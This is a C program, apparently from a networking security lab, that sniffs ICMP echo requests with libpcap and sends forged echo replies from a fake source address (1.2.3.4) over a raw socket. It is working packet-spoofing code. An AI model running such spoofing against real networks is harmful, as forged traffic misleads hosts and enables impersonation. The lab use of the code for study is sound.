#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/tcp.h>
#include <pcap/pcap.h>
#include <time.h>
#include <sys/time.h>




struct Apphdr {
    uint32_t unixtime;
    uint16_t length;
    union{
        uint16_t flags;
        uint16_t reserved:3,c_flag:1,s_flag:1,t_flag:1,status:10;
    };
    uint16_t cache;
    uint16_t spacing;
};

struct icmpheader {
    unsigned char icmp_type; // ICMP message type
    unsigned char icmp_code; // Error code
    unsigned short int icmp_chksum; //Checksum for ICMP Header and data
    unsigned short int icmp_id;     //Used for identifying request
    unsigned short int icmp_seq;    //Sequence number
};


/* IP Header */
struct ipheader {
    unsigned char      iph_ihl:4, //IP header length
    iph_ver:4; //IP version
    unsigned char      iph_tos; //Type of service
    unsigned short int iph_len; //IP Packet length (data + header)
    unsigned short int iph_ident; //Identification
    unsigned short int iph_flag:3, //Fragmentation flags
    iph_offset:13; //Flags offset
    unsigned char      iph_ttl; //Time to Live
    unsigned char      iph_protocol; //Protocol type
    unsigned short int iph_chksum; //IP datagram checksum
    struct  in_addr    iph_sourceip; //Source IP address
    struct  in_addr    iph_destip;   //Destination IP address
};

struct ethheader {
    u_char  ether_dhost[ETHER_ADDR_LEN]; /* destination host address */
    u_char  ether_shost[ETHER_ADDR_LEN]; /* source host address */
    u_short ether_type;                  /* IP? ARP? RARP? etc */
};




void send_raw_ip_packet(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,&enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

unsigned short in_cksum (unsigned short *buf, int length)
{
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp=0;

    /*
     * The algorithm uses a 32 bit accumulator (sum), adds
     * sequential 16 bit words to it, and at the end, folds back all
     * the carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }

    /* treat the odd byte at the end, if any */
    if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
    sum += (sum >> 16);                  // add carry
    return (unsigned short)(~sum);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,const u_char *packet) {
    /*********************************************************
       Step 1: Fill in the ICMP header.
     ********************************************************/
    struct icmpheader *icmp = (struct icmpheader *) (packet + sizeof(struct ipheader) + sizeof(struct ethheader));

    /* we want to send reply only if we see a request packet */
    if(icmp->icmp_type != 8){
        return;
    }

    icmp->icmp_type = 0; //ICMP Type: 8 is request, 0 is reply.
    // Calculate the checksum for integrity
    icmp->icmp_chksum = 0;//clear the checksum
    icmp->icmp_chksum = in_cksum((unsigned short *) icmp, header->len - sizeof(struct ipheader) - sizeof(struct ethheader));//calculate the checksum
    /*********************************************************
       Step 2: Fill in the IP header.
     ********************************************************/
    struct ipheader *ip = (struct ipheader *) (packet + sizeof(struct ethheader));

    in_addr_t temp = ip->iph_sourceip.s_addr;//save the source IP from the packet int a temp parameter
    ip->iph_sourceip.s_addr = inet_addr("1.2.3.4");//insert the fake IP
    ip->iph_destip.s_addr = temp;//switch between the original source IP and the fake IP
    ip->iph_protocol = IPPROTO_ICMP;
    /*********************************************************
       Step 3: Finally, send the spoofed packet
     ********************************************************/
    send_raw_ip_packet(ip);//function that sends a raw IP packet
}

int main()
{

    pcap_t *handle;// a pointer
    char errbuf[PCAP_ERRBUF_SIZE];// array for printing error
    struct bpf_program fp;
    char filter_exp[] = "icmp";// filtering via string
    bpf_u_int32 net = 0;


    // Step 1: Open live pcap session on NIC with name eth3
    handle = pcap_open_live("br-45812d6cc785", BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL){
        perror("error here");
        exit(1);
    }

    // Step 2: Compile filter_exp into BPF psuedo-code

    if(pcap_compile(handle, &fp, filter_exp, 0, net)){
        printf("error\n");
    }
    if(!pcap_setfilter(handle, &fp)){
        printf("setfilter succeded");
    }

    // Step 3: Capture packets
    pcap_loop(handle, -1, got_packet, NULL);

    pcap_close(handle);   //Close the handle
    return 0;
}
